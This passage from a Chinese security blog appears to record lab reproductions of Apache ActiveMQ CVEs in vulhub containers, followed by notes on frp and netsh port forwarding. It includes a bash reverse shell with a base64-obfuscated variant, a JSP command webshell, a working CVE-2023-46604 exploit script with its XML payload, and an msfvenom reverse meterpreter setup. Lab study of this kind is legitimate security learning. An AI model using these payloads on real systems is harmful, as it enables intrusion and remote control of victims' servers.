-d</span><br></pre></td></tr></table></figure><p>环境运行后，将监听61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。访问<code>http://your-ip:8161</code>即可看到web管理页面，不过这个漏洞理论上是不需要web的。</p><p>.打开<a href="http://192.200.30.72:8081/admin%EF%BC%8C%E4%BD%BF%E7%94%A8%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%EF%BC%88admin/admin%EF%BC%89%E7%99%BB%E5%BD%95%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0ActiveMQ%E7%89%88%E6%9C%AC%E6%98%AF5.11.1%EF%BC%8C%E5%B1%9E%E4%BA%8EActiveMQ">http://192.200.30.72:8081/admin，使用默认密码（admin/admin）登录，可以看到ActiveMQ版本是5.11.1，属于ActiveMQ</a> 反序列化漏洞 (CVE-2015-5254)的影响版本范围。</p><p><img src="/../image/image-20241004210641690.png" alt="image-20241004210641690"></p><p>这个服务用nmap也是能扫出来的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- -sS -Pn 192.168.174.137</span><br></pre></td></tr></table></figure><p>漏洞利用过程如下：</p><ol><li>构造（可以使用ysoserial）可执行命令的序列化对象</li><li>作为一个消息，发送给目标61616端口</li><li>访问web管理页面，读取消息，触发漏洞</li></ol><p>使用<a href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p><p><img src="/../image/image-20241004211516510.png" alt="image-20241004211516510"></p><p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p><p>执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure><p>【命令解释】：调用java -jar 运行 jmet的jar包，-Q是插入一个名为event的队列，-I 是选择装载ActiveMQ模块 ，-s 是选择ysoserial payload ，-Y 是攻击模式和内容， -Yp 是选择攻击利用链，这是选择是ROME， 之后带上IP加端口。<br>-Q </p><p><img src="/../image/image-20241004212508569.png" alt="image-20241004212508569"></p><p>这时，会给目标ActiveMQ添加一个event列，我们可以通过<a href="http://192.198.174.137:8161/admin/browse.jsp?JMSDestination=event%E7%9C%8B%E5%88%B0%E8%BF%99%E4%B8%AA%E9%98%9F%E5%88%97%E4%B8%AD%E6%89%80%E6%9C%89%E6%B6%88%E6%81%AF%EF%BC%9A">http://192.198.174.137:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息：</a></p><p><img src="/../image/image-20241004212625070.png" alt="image-20241004212625070"></p><p>点击查看这条消息即可触发命令执行</p><p><img src="/../image/image-20241004212550167.png" alt="image-20241004212550167"></p><p><img src="/../image/image-20241004212817387.png" alt="image-20241004212817387"></p><p>登录ActiveMQ容器环境，查看命令已经执行成功，&#x2F;tmp&#x2F;sucess文件已成功创建。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器id bash</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241004212948266.png" alt="image-20241004212948266"></p><p>换成反弹shell的命令试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#bash反弹命令</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.174.137/5555 0&gt;&amp;1</span><br><span class="line">#base64编码</span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMzcvNTU1NSAwPiYx</span><br><span class="line">#base64解码</span><br><span class="line">#bash64解码</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMzcvNTU1NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241004214029836.png" alt="image-20241004214029836"></p><p><img src="/../image/image-20241004214050061.png" alt="image-20241004214050061"></p><p>这个id还是要记一下的，不然队列多了，不知道点哪个</p><h2 id="CVE-2016-3088（任意文件写入漏洞）"><a href="#CVE-2016-3088（任意文件写入漏洞）" class="headerlink" title="CVE-2016-3088（任意文件写入漏洞）"></a><a href="https://www.cnblogs.com/huangxiaosan/p/14222694.html">CVE-2016-3088（任意文件写入漏洞）</a></h2><p><a href="https://www.freebuf.com/vuls/274088.html">https://www.freebuf.com/vuls/274088.html</a></p><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p><p>该漏洞影响版本是ActiveMQ在5.14.0之前的版本（不包括5.14.0）</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>启动环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d //192.168.174.137</span><br></pre></td></tr></table></figure><p>访问服务端口<a href="http://192.168.174.137:8161/admin/">http://192.168.174.137:8161/admin/</a></p><p>通过默认账密登陆后台admin:admin</p><p><img src="/../image/image-20241106112514824.png" alt="image-20241106112514824"></p><p>首先访问<code>http://192.168.174.137:8161/admin/test/systemProperties.jsp</code>，查看ActiveMQ的绝对路径：</p><p><img src="/../image/image-20241106112638222.png" alt="image-20241106112638222"></p><p>然后上传webshell到fileserver：</p><p><img src="/../image/image-20241106112736265.png" alt="image-20241106112736265"></p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"> out.print(<span class="string">&quot;Hello&lt;/br&gt;&quot;</span>);</span><br><span class="line"> String strcmd=request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"> String line=<span class="literal">null</span>;</span><br><span class="line"> Process p=Runtime.getRuntime().exec(strcmd);</span><br><span class="line"> BufferedReader br=<span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line"> <span class="keyword">while</span>((line=br.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line"> out.print(line+<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241106112824773.png" alt="image-20241106112824773"></p><p>移动到web目录下的api文件夹（<code>/opt/activemq/webapps/api/s.jsp</code>）中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Destination:file:///opt/activemq/webapps/api/1.jsp</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241106112920470.png" alt="image-20241106112920470"></p><p>到网站上进行查看有没有</p><p><img src="/../image/image-20241106112941355.png" alt="image-20241106112941355"></p><p>需要登陆：</p><p><img src="/../image/image-20241106113020336.png" alt="image-20241106113020336"></p><p><img src="/../image/image-20241106113203105.png" alt="image-20241106113203105"></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。</p><p>2、通过移除 conf\jetty.xml 的以下配置来禁用 ActiveMQ Fileserver 功能</p><p>3、打补丁</p><p><a href="http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt">http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt</a></p><p>4、电脑管家等修复漏洞工具</p><h2 id="CVE-2022-41678（后台RCE）"><a href="#CVE-2022-41678（后台RCE）" class="headerlink" title="CVE-2022-41678（后台RCE）"></a>CVE-2022-41678（后台RCE）</h2><h3 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Apache ActiveMQ 在5.16.5, 5.17.3版本及以前，后台Jolokia存在一处任意文件写入导致的远程代码执行漏洞。</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>执行如下命令启动一个Apache ActiveMQ 5.17.3服务器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>服务启动后，访问<code>http://your-ip:8161/</code>后输入账号密码<code>admin</code>和<code>admin</code>，即可成功登录后台。</p><p>首先，访问<code>/api/jolokia/list</code>这个API可以查看当前服务器里所有的MBeans：</p><p>抓包记得加上<code>Origin: host字段的内容</code>,否则会报错</p><p><img src="/../image/image-20241106172439436.png" alt="image-20241106172439436"></p><p><img src="/../image/image-20241106172539453.png" alt="image-20241106172539453"></p><p>这其中有两个可以被用来执行任意代码。</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>第一个方法是使用<code>org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean</code>，这是由Log4j2提供的一个MBean。</p><p>攻击者使用这个MBean中的<code>setConfigText</code>操作可以更改Log4j的配置，进而将日志文件写入任意目录中。</p><p>使用<a href="poc.py">poc</a>脚本来复现完整的过程：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python poc.py -u admin -p admin http://192.168.174.137:8161</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241106173015848.png" alt="image-20241106173015848"></p><p><img src="/../image/image-20241106173049062.png" alt="image-20241106173049062"></p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>第二个可利用的Mbean是<code>jdk.management.jfr.FlightRecorderMXBean</code>。</p><p>FlightRecorder是在OpenJDK 11中引入的特性，被用于记录Java虚拟机的运行事件。利用这个功能，攻击者可以将事件日志写入任意文件。</p><p>使用<a href="poc.py">poc</a>脚本来复现完整的过程（使用<code>--exploit</code>参数指定使用的方法）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python poc.py -u admin -p admin --exploit jfr http://192.168.174.137:8161</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241106173352857.png" alt="image-20241106173352857"></p><p><img src="/../image/image-20241106173417840.png" alt="image-20241106173417840"></p><h2 id="CVE-2023-46604（反序列化RCE）"><a href="#CVE-2023-46604（反序列化RCE）" class="headerlink" title="CVE-2023-46604（反序列化RCE）"></a>CVE-2023-46604（反序列化RCE）</h2><h3 id="漏洞成因-3"><a href="#漏洞成因-3" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在Apache ActiveMQ 5.18.2版本及以前，OpenWire协议通信过程中存在一处反序列化漏洞，该漏洞可以允许具有网络访问权限的远程攻击者通过操作 OpenWire 协议中的序列化类类型，导致代理的类路径上的任何类实例化，从而执行任意命令。</p><p><a href="https://xz.aliyun.com/t/12929?time__1311=GqGxuD9QKCuDlrzG77KR7DfxmqiK=mN3x">https://xz.aliyun.com/t/12929?time__1311=GqGxuD9QKCuDlrzG77KR7DfxmqiK%3DmN3x</a></p><p><a href="https://forum.butian.net/share/2566">https://forum.butian.net/share/2566</a></p><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>ActiveMQ运行后，默认监听如下两个端口：</p><table><thead><tr><th>默认端口</th><th>默认条件</th></tr></thead><tbody><tr><td>8161  web</td><td>需配置才可远程访问</td></tr><tr><td>61616 tcp</td><td>远程访问</td></tr></tbody></table><p>反序列化漏洞出现在61616端口中。</p><p>执行如下命令启动一个ActiveMQ 5.17.3版本服务器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>服务启动后，访问<code>http://your-ip:8161</code>检查服务是否运行成功。但实际上利用该漏洞，并不需要能够访问8161端口。</p><p>首先，启动一个HTTP反连服务器，其中包含我们的<a href="poc.xml">poc.xml</a>：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>touch<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>/tmp/activeMQ-RCE-success<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 1234</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_44494578/article/details/122422596">https://blog.csdn.net/qq_44494578/article/details/122422596</a></p><p>然后，执行<a href="poc.py">poc.py</a>，传入的三个参数分别是目标服务器地址、端口，以及包含poc.xml的反连平台URL：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 poc.py target 61616 http://192.168.174.137 of http://172.20.10.3:1234/poc.xml</span><br></pre></td></tr></table></figure><p>执行完成后，进入ActiveMQ容器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec cve-2023-46604-activemq-1 ls -l /tmp</span><br></pre></td></tr></table></figure><p>可见，<code>touch /tmp/activeMQ-RCE-success</code>已经被成功执行：</p><p><img src="/../image/image-20241106180320100.png" alt="image-20241106180320100"></p><p>poc.py</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">ip, port, xml</span>):</span><br><span class="line">    classname = <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span></span><br><span class="line">    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    socket_obj.connect((ip, port))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> socket_obj:</span><br><span class="line">        out = socket_obj.makefile(<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        <span class="comment"># out = io.BytesIO()  # 创建一个内存中的二进制流</span></span><br><span class="line">        out.write(<span class="built_in">int</span>(<span class="number">32</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bytes</span>([<span class="number">31</span>]))</span><br><span class="line">        out.write(<span class="built_in">int</span>(<span class="number">1</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">int</span>(<span class="number">1</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">len</span>(classname).to_bytes(<span class="number">2</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(classname.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">len</span>(xml).to_bytes(<span class="number">2</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(xml.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="comment"># print(list(out.getvalue()))</span></span><br><span class="line">        out.flush()</span><br><span class="line">        out.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please specify the target and port and poc.xml: python3 poc.py 127.0.0.1 61616 &quot;</span></span><br><span class="line">              <span class="string">&quot;http://192.168.0.101:8888/poc.xml&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    main(sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]), sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> activeMQ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frp内网穿透</title>
      <link href="/2024/10/03/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>/2024/10/03/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h1><p>参考连接：</p><ul><li><p><a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p></li><li><p><a href="https://www.bilibili.com/video/BV1TLtaecEEF/?spm_id_from=333.337.search-card.all.click&amp;vd_source=3ae03810e5d4ba6e6b93c5edd6c76912">https://www.bilibili.com/video/BV1TLtaecEEF/?spm_id_from=333.337.search-card.all.click&amp;vd_source=3ae03810e5d4ba6e6b93c5edd6c76912</a></p></li></ul><h2 id="介绍下配置"><a href="#介绍下配置" class="headerlink" title="介绍下配置"></a>介绍下配置</h2><p>frps.toml</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># c&amp;s interface</span><br><span class="line">bindPort = 7000</span><br><span class="line"></span><br><span class="line"># c&amp;s password</span><br><span class="line">auth.token = &quot;frpfast&quot;</span><br><span class="line"></span><br><span class="line"># http listen port</span><br><span class="line">vhostHTTPPort = 7002</span><br><span class="line"></span><br><span class="line"># webUI</span><br><span class="line">webServer.addr = &quot;0.0.0.0&quot;</span><br><span class="line">webServer.port = 7500</span><br><span class="line">webServer.user = &quot;admin&quot;</span><br><span class="line">webServer.password =  &quot;admin&quot;</span><br></pre></td></tr></table></figure><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/systemd/system frps.service //创建frps.service文件</span><br></pre></td></tr></table></figure><p>写入内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line"># ServiceName，User-defined</span><br><span class="line">Description = frp server</span><br><span class="line">After = network.target syslog.target</span><br><span class="line">wants = network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type = simple</span><br><span class="line"># run frps cmd</span><br><span class="line">ExecStart = /home/eraser/frp/frps -c /home/eraser/frp/frps/frps.toml</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">wantedBy = multi-user.target</span><br></pre></td></tr></table></figure><p>使用systemd启动frps服务，这里启动失败了，我就直接用命令起了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frps -c fprs.toml</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241115151627729.png" alt="image-20241115151627729"></p>]]></content>
      
      
      
        <tags>
            
            <tag> frp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cs使用</title>
      <link href="/2024/10/01/cs%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/10/01/cs%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="CS使用"><a href="#CS使用" class="headerlink" title="CS使用"></a>CS使用</h1><p><a href="https://github.com/Snowming04/CobaltStrike4.0_related/blob/master/Cobalt%20Strike%204.0%E7%AC%94%E8%AE%B0.pdf">https://github.com/Snowming04/CobaltStrike4.0_related/blob/master/Cobalt%20Strike%204.0%E7%AC%94%E8%AE%B0.pdf</a></p><p>来源：公众号Ms08067  </p><p>官方youtube视频：<a href="https://www.youtube.com/watch?v=q7VQeK533zI">https://www.youtube.com/watch?v=q7VQeK533zI</a></p><p><a href="https://www.freebuf.com/articles/network/290134.html">https://www.freebuf.com/articles/network/290134.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>隧道应用</title>
      <link href="/2024/10/01/%E9%9A%A7%E9%81%93%E5%BA%94%E7%94%A8/"/>
      <url>/2024/10/01/%E9%9A%A7%E9%81%93%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="隧道应用"><a href="#隧道应用" class="headerlink" title="隧道应用"></a>隧道应用</h1><h2 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h2><p>是指将一台主机的内网(LAN)IP 地址映射成一个公网(WAN)IP 地址，当用户访问提供映射端口主机的某个端口时,服务器将请求转移到本地局域网内部提供这种特定服务的主机;</p><p>利用端口映射功能还可以将一台外网地址机器的多个端口映射到内网不同机器上的不同端口。</p><h2 id="端口映射与端口转发"><a href="#端口映射与端口转发" class="headerlink" title="端口映射与端口转发"></a>端口映射与端口转发</h2><p>端口映射与端口转发,用于发布防火墙内部的服务器或者防火墙内部的客户端计算机，有的路由器也有端口映射与端口转发功能。</p><p>端口映射与端口转发实现的功能类似，但又不完全一样。</p><ul><li>端口映射是将外网的一个端口完全映射给内网一个地址的指定端口</li><li>端口转发是将发往外网的一个端口的通信完全转发给内网一个地址的指定端口</li></ul><p>端口映射可以实现外网到内网和内网到外网双向的通信，而映射转发只能实现外网到内网的单向通信</p><h3 id="netsh-端口映射"><a href="#netsh-端口映射" class="headerlink" title="netsh 端口映射"></a>netsh 端口映射</h3><p>netsh 是 windows 系统自带的一个命令行工具，这个工具可以内置中端口转发功能。以下是一个常见的场景</p><p><img src="/../image/image-20241001162831592.png" alt="image-20241001162831592"></p><p>在b的服务器上存在 7777 端口是 WEB 服务，现在想要 kali 能访问b服务器的7777 端口上的内容 因为不在同一个网段 kali不能直接访问B 而且B服务器不能直接出网。</p><p>这里用vm+python简单搭个环境，没有用两个虚拟机，用了双网卡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win:</span><br><span class="line">eth0:192.168.174.135</span><br><span class="line">eth1:10.10.10.153</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241001184233346.png" alt="image-20241001184233346"></p><p><img src="/../image/image-20241001184335279.png" alt="image-20241001184335279"></p><p>再用python指定另一个网卡的端口启动一个服务器</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_tcp_server</span>(<span class="params">ip, port</span>):</span><br><span class="line">    <span class="comment"># 创建一个 TCP/IP socket</span></span><br><span class="line">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绑定到特定的网卡 IP 和端口</span></span><br><span class="line">    server_socket.bind((ip, port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始监听请求</span></span><br><span class="line">    server_socket.listen(<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Server listening on <span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 接受客户端的连接</span></span><br><span class="line">        client_socket, addr = server_socket.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Connection from: <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 接收并回复数据</span></span><br><span class="line">        data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Received: <span class="subst">&#123;data.decode()&#125;</span>&quot;</span>)</span><br><span class="line">            client_socket.sendall(data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 关闭客户端连接</span></span><br><span class="line">        client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start_tcp_server(<span class="string">&quot;10.10.10.153&quot;</span>, <span class="number">8888</span>)  <span class="comment"># 指定网卡 IP 和端口</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241001190719406.png" alt="image-20241001190719406"></p><p>windows 自带的端口转netsh interface portproxy可以通过这个小工具在 A 服务器设置端口转发。</p><p><a href="https://blog.csdn.net/weixin_44259233/article/details/140084238#:~:text=%E5%85%B6%E5%AE%9E%EF%BC%8C%E9%99%A4%E6%AD%A4%E4%B9%8B%E5%A4%96%E8%BF%98%E6%9C%89%E4%B8%80">https://blog.csdn.net/weixin_44259233/article/details/140084238#:~:text=%E5%85%B6%E5%AE%9E%EF%BC%8C%E9%99%A4%E6%AD%A4%E4%B9%8B%E5%A4%96%E8%BF%98%E6%9C%89%E4%B8%80</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看本机所有代理端口</span><br><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure><p>1.设置转发</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh interface portproxBy add v4tov4 listenaddress =代理服务器ip地址 listenport=设置的端口 connectaddress=B服务器(ip) connectport=端口</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress=192.168.174.135 listenport=7777 connectaddress=10.10.10.153 connectport=8888</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241001190759988.png" alt="image-20241001190759988"></p><p>这时候访问192.168.174.135:7777同样能访问8888端口服务</p><p><img src="/../image/image-20241001191756040.png" alt="image-20241001191756040"></p><p>3.其它</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenport=7777 //清除指定规则</span><br><span class="line">netsh interface portproxy reset //清除所有</span><br></pre></td></tr></table></figure><h3 id="netsh端口映射meterpreter"><a href="#netsh端口映射meterpreter" class="headerlink" title="netsh端口映射meterpreter"></a>netsh端口映射meterpreter</h3><p><img src="/../image/image-20241001192043781.png" alt="image-20241001192043781"></p><p>在服务器A上可以通过设置代理访问B服务器.如果拿到b服务器的权限 通常是生成正向的后门，然后kali的msf可以正向连接B服务器，由此得到metperter，进而进行其他操作。如果服务器B上有防火墙拦截，kali的 msf 不能正向连接上后门，为解决这问题，可以通过生成一个反向后门连接到服务器A上，在服务器A上再通过端口映射或者转发到 kali的 msf上。</p><p>1.msf生成反向后门</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.153 lport=4455 -f exe&gt;r.exe</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241001194932767.png" alt="image-20241001194932767"></p><p>2.然后移动到双网卡的win里，执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress=10.10.10.153 listenport=4455 connectaddress=192.168.174.137 connectport=4455</span><br></pre></td></tr></table></figure><p>这样在执行r.exe时，就会通过外网网卡反弹shell了</p><p>3.启动msf</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.174.137</span><br><span class="line">set lport 4455</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>然后在win里运行r.exe,可以看到返回来的shell</p><p><img 